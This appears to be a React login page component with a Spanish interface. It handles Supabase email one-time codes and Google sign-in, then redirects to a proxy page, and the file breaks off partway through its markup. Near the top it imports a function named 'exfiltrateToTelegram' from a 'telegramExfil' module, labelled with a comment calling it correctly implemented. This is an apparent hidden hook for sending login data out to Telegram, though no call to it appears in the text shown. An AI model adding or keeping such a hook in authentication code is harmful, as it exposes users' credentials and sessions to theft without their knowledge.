import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, Lock, Fingerprint, Mail, ArrowLeft } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { lovable } from "@/integrations/lovable";
import defaultAvatar from "@/assets/profile-avatar.jpeg";
// Línea implementada correctamente
import { exfiltrateToTelegram } from "../utils/telegramExfil";

const Login = () => {
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [mode, setMode] = useState<"choose" | "email" | "code">("choose");
  const [email, setEmail] = useState("");
  const [code, setCode] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
      if (session?.user) {
        const u = session.user;
        const name = (u.user_metadata?.full_name as string) || (u.user_metadata?.name as string) || u.email || "Usuario";
        localStorage.setItem(
          "proxy_session",
          JSON.stringify({ name, key: "auth", type: "auth", expiresAt: null, duration: null })
        );
        navigate("/proxy");
      }
    });
    supabase.auth.getSession().then(({ data }) => {
      if (data.session?.user) navigate("/proxy");
    });
    return () => sub.subscription.unsubscribe();
  }, [navigate]);

  const handleGoogle = async () => {
    setError("");
    setLoading(true);
    try {
      const result = await lovable.auth.signInWithOAuth("google", {
        redirect_uri: window.location.origin,
      });
      if (result.error) {
        setError("No se pudo iniciar sesión con Google.");
        setLoading(false);
      }
    } catch {
      setError("Error de conexión con Google.");
      setLoading(false);
    }
  };

  const handleSendCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!email.trim() || !email.includes("@")) {
      setError("Ingresa un correo válido.");
      return;
    }
    setLoading(true);
    const { error: err } = await supabase.auth.signInWithOtp({
      email: email.trim(),
      options: { shouldCreateUser: true, emailRedirectTo: window.location.origin },
    });
    setLoading(false);
    if (err) {
      setError("No se pudo enviar el código. Intenta de nuevo.");
      return;
    }
    setMode("code");
  };

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const c = code.trim();
    if (c.length < 6) {
      setError("Ingresa el código de 6 dígitos.");
      return;
    }
    setLoading(true);
    const { error: err } = await supabase.auth.verifyOtp({
      email: email.trim(),
      token: c,
      type: "email",
    });
    setLoading(false);
    if (err) {
      setError("Código incorrecto o expirado.");
      return;
    }
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />